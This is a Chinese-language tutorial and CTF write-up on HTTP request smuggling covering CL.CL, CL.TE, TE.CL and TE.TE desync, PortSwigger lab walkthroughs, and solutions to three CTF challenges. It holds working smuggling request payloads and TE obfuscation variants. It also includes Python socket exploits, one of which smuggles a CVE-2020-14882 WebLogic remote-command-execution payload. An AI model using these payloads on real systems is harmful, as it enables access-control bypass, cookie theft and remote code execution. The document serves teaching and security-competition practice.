0x00 前言
=======

​ 最近刷题的时候多次遇到HTTP请求走私相关的题目，但之前都没怎么接触到相关的知识点，只是在**GKCTF2021--hackme**中使用到了 **CVE-2019-20372(Nginx&lt;1.17.7 请求走私漏洞)**，具体讲就是通过nginx的走私漏洞访问到Weblogic Console的登录页面，然后打Weblogic历史漏洞读取flag。当时做那道题的时候对走私漏洞没有深入理解，今天打ISCC2022的时候又遇到了一道利用gunicorn&lt;20.04请求走私漏洞绕waf的题目，因此好好学习一下还是很有必要的。

0x01 发展时间线
==========

> ​ 最早在2005年，由Chaim Linhart，Amit Klein，Ronen Heled和Steve Orrin共同完成了一篇关于HTTP Request Smuggling这一攻击方式的报告。通过对整个RFC文档的分析以及丰富的实例，证明了这一攻击方式的危害性。
> 
> <https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf>
> 
> ​ 在2016年的**`DEFCON 24`** 上，@regilero在他的议题——Hiding Wookiees in HTTP中对前面报告中的攻击方式进行了丰富和扩充。
> 
> \[[https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf\](https://media.defcon.org/DEF](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf%5D(https://media.defcon.org/DEF) CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf)
> 
> ​ 在2019年的**`BlackHat USA 2019`**上，PortSwigger的James Kettle在他的议题——HTTP Desync Attacks: Smashing into the Cell Next Door中针对当前的网络环境，展示了使用分块编码来进行攻击的攻击方式，扩展了攻击面，并且提出了完整的一套检测利用流程。

0x02 什么是请求走私
============

​ 当今的web架构中，单纯的一对一客户端---服务端结构已经逐渐过时。为了更安全的处理客户端发来的请求，服务端会被分为两部分：**前端服务器与后端服务器**。前端服务器(例如代理服务器)负责安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，并对每一个请求都进行响应。但是在这个过程中要保证前端服务器与后端服务器的请求边界设定一致，**如果前后端服务器对请求包处理出现差异，那么就可能导致攻击者通过发送一个精心构造的http请求包，绕过前端服务器的安全策略直接抵达后端服务器访问到原本禁止访问的服务或接口，这就是http请求走私。**

​ 听起来是不是有点像SSRF？不过SSRF与HTTP请求走私是有差别的，SSRF是直接利用内网机器来访问内网资源，但请求走私不是。用一张portswigger报告中经典的图来理解一下，有一种夹带私货的感觉，或许这就是被称为走私漏洞的原因吧：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-26abe4fc2110ea0e927ca2e8736c698b332a7100.png)

0x03 漏洞成因与常见类型
==============

​ http请求走私攻击比较特殊，它不像常规的web漏洞那样直观。它更多的是在复杂网络环境下，不同的服务器对RFC标准实现的方式不同，程度不同。因此，对同一个HTTP请求，不同的服务器可能会产生不同的处理结果，这样就产生了安全风险。

​ 在学习之前我们先了解一下HTTP1.1中使用最为广泛的两种特性：**Keep-Alive&amp;Pipeline**。

Keep-Alive&amp;Pipeline
-----------------------

​ 所谓`Keep-Alive`，就是在HTTP请求中增加一个特殊的请求头`Connection: Keep-Alive`，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在`HTTP1.1`中是默认开启的。

​ 有了`Keep-Alive`之后，后续就有了`Pipeline`，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。

​ 如今，浏览器默认是不启用`Pipeline`的，但是一般的服务器都提供了对`Pipleline`的支持。

CL&amp;TE
---------

​ CL 和 TE 即是 `Content-Length` 和 `Transfer-Encoding` 请求头（严格来讲前者是个实体头，为了方便就都用请求头代指）。这里比较有趣的是 `Transfer-Encoding`（HTTP/2 中不再支持），指定用于传输请求主体的编码方式，可以用的值有 chunked/compress/deflate/gzip/identity ，完整的定义在 [Transfer-Encoding#Directives](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding#Directives) 和 [rfc2616#section-3.6](https://tools.ietf.org/html/rfc2616#section-3.6)

​ CL好理解，对于TE我们重点关注chunked。当我们设置TE为chunked时，CL就会被省略。为了区分chunk的边界，我们需要在每个chunk前面用16进制数来表示当前chunk的长度，后面加上\\r\\n，再后面就是chunk的内容，然后再用\\r\\n来代表chunk的结束。最后用长度为 0 的块表示终止块。终止块后是一个 trailer，由 0 或多个实体头组成，可以用来存放对数据的数字签名等。譬如下面这个例子：

```php
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b  //chunk_size
q=smuggling
6
hahaha
0  //end
[blank]
[blank]
```

**另外要注意\\r\\n占2字节**，我们在计算长度的时候很容易把它们忽略。最后把请求包以字节流形式表述出来就是：

```php
POST / HTTP/1.1\r\nHost: 1.com\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\nb\r\nq=smuggling\r\n6\r\nhahaha\r\n0\r\n\r\n
```

常见走私类型
------

### 1.CL不为0

如果前端代理服务器允许GET携带请求体，而后端服务器不允许GET携带请求体，后端服务器就会直接忽略掉GET请求中的`Content-Length`头，这就有可能导致请求走私。

例如我们构造出：

```php
GET / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 43\r\n

GET / admin HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

在前端服务器看来它是一个请求，但是在后端服务器来看它就是：

```php
//第一个请求
GET / HTTP/1.1\r\n
Host: example.com\r\n

//第二个请求
GET / admin HTTP/1.1\r\n
Host: example.com\r\n
```

### 2.CL CL

在`RFC7230`的第`3.3.3`节中的第四条中，规定当服务器收到的请求中包含两个`Content-Length`，而且两者的值不同时，需要返回400错误。

<https://tools.ietf.org/html/rfc7230#section-3.3.3>

但是很明显这并非是强制的，如果服务器不遵守安全规定在服务器收到多个CL不相同的请求时不返回400错误，那么就可能会导致请求走私。

我们假设前端服务器按照第一个CL处理而后端服务器按照第二个CL，构造出如下HTTP包：

```php
POST / HTTP/1.1\r\n
Host: example.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a
```

前端代理服务器收到的请求通过第一个CL判断body为8字节，随后将包发送给后端源服务器；源服务器收到请求通过第二个CL判断body为7字节，这时候最后一个字节 `b'a'`就会被遗留在源服务器缓存器。由于前后端服务器一般是宠用TCP连接，假设此时正常用户向服务器发送了正常的数据包，如下：

```php
GET / HTTP/1.1\r\n
Host: example.com\r\n
```

这时残留在缓存中的一个字节就会被添加到这个正常的请求前端变成：

```php
aGET / HTTP/1.1\r\n
Host: example.com\r\n
```

导致了请求走私，正常数据包被篡改。

但很明显这种情况过于“巧合”应该很难遇见，存在两个CL的包一般服务器都不会接受，在`RFC2616`的第4.4节中，规定:`如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length`，这就意味着我们可以在头部同时包含这两种请求头，相比这下这种方式更现实一些。

### 3.CL TE

所谓CL TE就是前置服务器认为 `Content-Length` 优先级更高（或者说根本就不支持 `Transfer-Encoding` ） ，后端服务器认为 `Transfer-Encoding` 优先级更高。

我们可以构造出body中带有字节 `0`的请求包，前端服务器通过CL判断这是一个正常的数据包并转发给后端，后端服务器使用TE就会把字节`0`后的数据滞留到缓冲区，并且与下一次的正常请求进行拼接，这里用一下portswigger团队的lab作为实验：<https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te>

构造如下请求包:

```php
POST / HTTP/1.1\r\n
Host: ac721f8e1fcb0119c0b98800005c0061.web-security-academy.net\r\n
Cookie: session=ehzpRrrgyPHDRJtSnaWLcZ0fstSXLWiC\r\n
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"\r\n
Sec-Ch-Ua-Mobile: ?0\r\n
Sec-Ch-Ua-Platform: "Windows"\r\n
Upgrade-Insecure-Requests: 1\r\n
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n
Sec-Fetch-Site: none\r\n
Sec-Fetch-Mode: navigate\r\n
Sec-Fetch-User: ?1\r\n
Sec-Fetch-Dest: document\r\n
Accept-Encoding: gzip, deflate\r\n
Accept-Language: zh-CN,zh;q=0.9\r\n
Connection: close\r\n
Content-Length: 10\r\n
Transfer-Encoding:chunked\r\n
\r\n
0\r\n
\r\n
A\r\n
\r\n
```

连续发送几次就会发现字母A被拼接到了下一请求中，导致了请求走私，当然也会报错。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-46998dbbeada0d2fc3f504c9c94bee08c5d0b147.png)

### 4.TE CL

TE CL与CL TE正好相反，假如前端服务器处理TE请求头，而后端服务器处理CL请求头，我们同样可以构造恶意数据包完成走私攻击；依旧使用portswigger的lab：<https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl>

我们构造出如下请求：

```php
POST / HTTP/1.1
Host: ac901ff41f9aa7fdc0ce7b16001000db.web-security-academy.net
Cookie: session=MrJkkUD4dyxv9gzzgERPtb56d0cCo79Z
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

12
WPOST / HTTP/1.1

0

```

多次发送后发现：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-e2bfc68549bd25feb3f0dce03aeec4314aaa2aab.png)

WPOST被拆分了出来，重点关注body部分

```php
\r\n
12\r\n
WPOST / HTTP/1.1\r\n
\r\n
0\r\n
\r\n
```

前端处理TE读取到`0\r\n\r\n`之后就认为读取完毕发送给后端，而后端处理CL只读取4字节`\r\n12`就认为数据包结束，这时候剩下的`WPOST / HTTP/1.1\r\n\r\n0\r\n\r\n`就被认为是另一个请求，因此发生了请求报错。

### 5.TE TE

TE-TE：前置和后端服务器都支持 `Transfer-Encoding`，但通过混淆能让它们在处理时产生分歧。

lab:<https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header>

构造出如下请求包：

```php
POST / HTTP/1.1
Host: ace41f161f1a1382c0814ee300db0086.web-security-academy.net
Cookie: session=nqskpdP0aWuG4GW5xlYYxEUVulcJC6vG
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding:chunked  //两种TE造成混淆
Transfer-Encoding:cow

5c
WPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

多次发送后：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c5e8cb41e285f53cc0eaf6ceb992fc43ba6a9f60.png)  
可以看到这里我们采用了：

```php
Transfer-Encoding:chunked\r\n
Transfer-Encoding:cow\r\n
```

除了这种混淆方式，除了这些portswigger团队还给出了其它可用于TE混淆的payload：

> Transfer-Encoding: xchunked  
> Transfer-Encoding\[空格\]: chunked  
> Transfer-Encoding: chunked  
> Transfer-Encoding: x  
> Transfer-Encoding:\[tab\]chunked  
> \[空格\]Transfer-Encoding: chunked  
> X: X\[\\n\]Transfer-Encoding: chunked  
> Transfer-Encoding  
> : chunked

0x04 走私攻击应用实例
=============

1.使用CL TE走私获取其他用户的请求
--------------------

lab：<https://ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net/>

打开页面是blog，用户可以在页面发表评论，由于前后端服务器的请求头处理差异导致我们可以利用CL TE获取其它用户的请求头，譬如我们构造出如下请求：

```php
POST / HTTP/1.1
Host: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net
Cookie: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO
Content-Length: 333
Transfer-Encoding:chunked
Content-Type: application/x-www-form-urlencoded

0

POST /post/comment HTTP/1.1
Host: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net
Cookie: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO
Content-Length: 700
Content-Type: application/x-www-form-urlencoded

csrf=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&postId=6&name=a&email=1%40qq.com&website=http%3A%2F%2F1.com&comment=spring
```

前端服务器使用CL验证，获取CL为333后判定这是一个正常的请求并发送给后端，而后端服务器通过TE的结尾表标识`0\r\n\r\n`认为前半部分是一个正常的请求，而后半部分：

```php
POST /post/comment HTTP/1.1
Host: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net
Cookie: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO
Content-Length: 700
Content-Type: application/x-www-form-urlencoded

csrf=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&postId=6&name=a&email=1%40qq.com&website=http%3A%2F%2F1.com&comment=spring
```

因为Pipeline的存在被放置在了缓存区。如果这时另一个正常用户也发来了一段评论，那么这个请求会被拼接到滞留在缓存区的请求后面构成一个新的请求：

```php
POST /post/comment HTTP/1.1
Host: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net
Cookie: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO
Content-Length: 700
Content-Type: application/x-www-form-urlencoded

csrf=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&postId=6&name=a&email=1%40qq.com&website=http%3A%2F%2F1.com&comment=springPOST /post/comment HTTP/1.1
Host: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net
Cookie: session=ashAwdweas.......
```

这时候我们就发现**请求头被拼接到了comment的后面然后被当作comment返回**，这样我们就可能通过获取到其他用户的Cookie。

在lab中我们要不断第二个CL的大小，调整至合适大小才有可能正常泄露出来；我从700开始服务器报500，但不知道是哪里出了问题响应一直超时：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f6f749636e3bcef8a851077b1d210e9f6105451c.png)

不过原理还是很好理解，大家可以自己去试一试，有点玄学。

2.泄露请求头重写请求实现未授权访问
------------------

前面我们提到，前端服务器的作用之一就是过滤外界用户对于未授权接口的访问，一般前端用户收到一段请求后，会在包里添加一些请求头例如：

- 用户的`session`等会话ID。
- XFF头用于显示用户IP，当然一般不会是`X-Forwarded-For`因为很容易被猜到。
- 用户指纹信息、`token`等。

**如果我们能泄露这些前端服务器向后端服务器中继发送的请求中的请求头，那么我们就可以伪造出前端服务器的请求包来完成对敏感接口的未授权访问，实现一些恶意操作。**

那么问题来了，我们如何能获取到前端服务器发送到后端服务器的请求头呢？其实不难想，如果服务器能对我们输入的POST参数，即body部分响应输出，然后我们构造一个普通的请求放在body后面，前端服务器接收到之后就会对我们添加的请求进行重写，如果我们的指定`Content-Length`为较大的值就会把前端服务器重写时添加的重要字段给泄露出来拼接到body后面，随后后端服务器会将其与响应一并返回。

这么讲可能还是有些抽象，我们拿lab来举例：

<https://acbc1f4d1e121980c02b64d600c40022.web-security-academy.net/>

构造出如下请求包：

```php
POST / HTTP/1.1
Host: acbc1f4d1e121980c02b64d600c40022.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Cookie: session=RcsAYo8SoCQx0bwXn0oG0G1RkLNPHuz4
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Transfer-Encoding:chunked

0

POST / HTTP/1.1
Content-Length:70
Connection:close

search=111

```

多发送几次我们会发现成功泄露出来XFF头信息：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-dbaf09522081b4ff7d7b20de896191d300344db3.png)  
我们简单捋一下过程便于理解，首先前端服务器通过CL判断出这是一个完整的请求并转发给后端服务器，后端服务器通过TE将`0`字节标识前的部分正常处理，后半部分也被看作是一次正常的请求但被滞留在缓存区，同时由于我们设置的CL是超过实际长度，缓存区就会等待下一次正常请求，也就是前端服务器发来的新请求截取其部分请求头放在请求参数后面凑够CL后一并返回。

我们走私到后端服务器被滞留在缓存区的请求是：

```php
POST / HTTP/1.1
Content-Length:70
Connection:close

search=111

```

后端服务器接收到新请求并拼接在search之后是：

```php
POST / HTTP/1.1
Content-Length:70
Connection:close

search=111 POST / HTTP/1.1 X-TsINOz-Ip: 117.136.5.78 Host:......
```

最后后端服务器就会将信息响应返回。

3.其它应用
------

除了这两种还有一些利用方式：

- 反射型 XSS 组合拳
- 将 on-site 重定向变为开放式重定向
- 缓存投毒
- 缓存欺骗

这些**@mengchen**师傅在知道创宇404发的paper里都有实验讲解，感兴趣的可以去看一看。(paper链接在文末)

0x05 CTF实战利用
============

GKCTF2021\[hackme\]
-------------------

这道题目首先是需要nosql注入爆出密码，然后登陆获得任意文件读取功能，前半部分我们暂且忽略，我们重点关注后半部分。

读取nginx配置文件发现后端存在weblogic服务：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-41792f2dea7d8caa2fd2b29e904f3b0c06bb5ab5.png)

同时注意到nginx版本为1.17.6，存在请求走私：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-a82997ff0435c310c882fdf5ab8fde2d0cf71f2f.png)  
假如我们构造：

```php
GET /a HTTP/1.1
Host: localhost
Content-Length: 56
GET /_hidden/index.html HTTP/1.1
Host: notlocalhost
```

那么nginx会把这两个请求都执行，这就会造成请求走私。可参考：<https://v0w.top/2020/12/20/HTTPsmuggling/#5-2-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx-lt-1-8-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81>

针对这道题目我们构造出如下请求包：

```php
GET /test HTTP/1.1
Host: node4.buuoj.cn:27230
Content-Length: 0
Transfer-Encoding: chunked

GET /console/login/LoginForm.jsp HTTP/1.1
Host: weblogic

```

响应包中包含了weblogic的版本信息：

```php
WebLogic Server Version: 12.2.1.4.0
```

版本正好契合CVE-2020-14882，我们直接拿socket去打就可以拿到flag。

### 最终exp

```php
//来源于https://www.lemonprefect.cn的博客
import socket

sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sSocket.connect(("node4.buuoj.cn", 26319))
payload = b'''HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n'''
sSocket.send(payload)
sSocket.settimeout(2)
response = sSocket.recv(2147483647)
while len(response) > 0:
    print(response.decode())
    try:
        response = sSocket.recv(2147483647)
    except:
        break
sSocket.close()
```

RCTF2019\[esay calc\]
---------------------

### 常规绕waf

首先查看源码根据提示来到calc.php

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-c8d15bf9f7e61081a04d876cc3b86d99100689e5.png)

代码对特殊字符进行了一些过滤，注意到最后代码执行，我们传入：

```php
calc.php?num=;)phpinfo();//
```

执行后发现：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-28f86821fd29cc9c12a094266f102c4048772b55.png)

明显是有waf不合法请求，有一种做法是**参数前面加空格使服务器无法解析绕waf**，再用ascii转码读文件：

```php
? num=readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-f09854e4b0df8dd2cc1f0a51edc4b7b7167cea74.png)

### 走私绕waf

注意到只要能让前端服务器报错我们就能突破前端waf限制；所以事实上我们还可以利用走私攻击绕waf，而且前面四种方式都是有效的，这里**举两个例子**，剩下几种大家可以自行尝试：

注意下面的请求中num前没有空格了。

#### CL CL

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-75dc051f17d25aabbde23ee3876ff5f8728966bf.png)

#### CL TE

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-36fd1f6b77577d1684ec4549ef76000112f50a2d.png)

ISCC2022\[让我康康!\]
-----------------

### 分析与利用

​ 如果直接访问flag会报403：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-67426761baf7031a640a3db578fc5e66b573431d.png)

我们通过相应包的头部发现了gunicorn20.0，经查阅版本存在请求走私，具体可参考：

<https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/>

通过给出的POC我们编写脚本成功实现请求走私，看到要求很明显是需要获取前端服务器请求头的来源IP名称来伪造本地访问获取flag：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-30a145534a115e3cf79dcd31782e8b4db4027a1f.png)

那么我的思路就是多次发送请求，并且设置前一个请求的CL为超过实际请求体的较大数值；由于后端服务器设置Keep-Alive，所以它会误认为请求没有发送完毕，会继续等待；而这时候我们再给前端服务器发送一个请求，前端服务器就会把带有来源IP头部的http包发送给后端服务器，后端服务器接收足够上一包内CL的时候就会把这个泄露敏感凭证的包一并返回给客户端，从而造成了敏感信息泄露。

其实思路与上面讲到的应用实例2一样，**只不过gunicorn20.0的走私漏洞是由于默认Sec-Websocket-Key的配置导致后端服务器会以xxxxxxxx为标识位，这就导致xxxxxxxx后面的部分会滞留在缓存区，可以认为是一种变种的CL TE走私。**

我们可以通过burp直接构造请求，**但是由于Content-Length需要我们自定义，比如第一个Content-Length仅仅是计算到第一个手动添加的POST请求，所以构造的时候要额外小心。**

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-591fdb728dfbda6136c36ed51b0bd14f1845ccc6.png)

当然我们直接写脚本拿socket发更直观。

### 最终exp

```php
import socket

secret_payload=b'''POST / HTTP/1.1\r
Host: 59.110.159.206:7020\r
Content-Length: 149\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Content-Type: application/x-www-form-urlencoded\r
Sec-Websocket-Key1:x\r
\r
xxxxxxxxPOST / HTTP/1.1\r
Host:127.0.0.1\r
secr3t_ip: 127.0.0.1\r
Content-Length: 150\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=abc\r
\r
POST / HTTP/1.1\r
Content-Length: 14\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=111\r
\r
'''

final_payload=b'''POST / HTTP/1.1\r
Host: 59.110.159.206:7020\r
Content-Length: 152\r
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\r
Content-Type: application/x-www-form-urlencoded\r
Sec-Websocket-Key1:x\r
\r
xxxxxxxxGET /fl4g HTTP/1.1\r
Host:127.0.0.1\r
secr3t_ip: 127.0.0.1\r
Content-Length: 150\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=abc\r
\r
POST / HTTP/1.1\r
Content-Length: 14\r
Content-Type: application/x-www-form-urlencoded\r
\r
search=111\r
\r
'''
test1 = b'''POST / HTTP/1.1\r
Host: 127.0.0.1\r
Content-Length: 67\r
Sec-Websocket-Key1:x\r
\r
xxxxxxxxGET /fl4g HTTP/1.1\r
Host:127.0.0.1\r
Content-Length: 123\r
\r
GET / HTTP/1.1\r
Host: 127.0.0.1\r
\r
'''
test2=b'''POST / HTTP/1.1
Host: 59.110.159.206:7020
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

search=123'''

sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sSocket.connect(("59.110.159.206", 7020))

def send(payload):
    print(payload)
    sSocket.send(payload)
    sSocket.settimeout(2)
    response = sSocket.recv(2147483647)
    while len(response) > 0:
        print(response.decode())
        try:
            response = sSocket.recv(2147483647)
        except:
            break
    sSocket.close()

if __name__ == '__main__':
    send(final_payload)
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/09/attach-589df127a926279792d52e7548aec458019aaddc.png)

0x06 Reference
==============

<https://regilero.github.io/tag/Smuggling/>

<https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn>

<https://paper.seebug.org/1048>

<https://xz.aliyun.com/t/7501>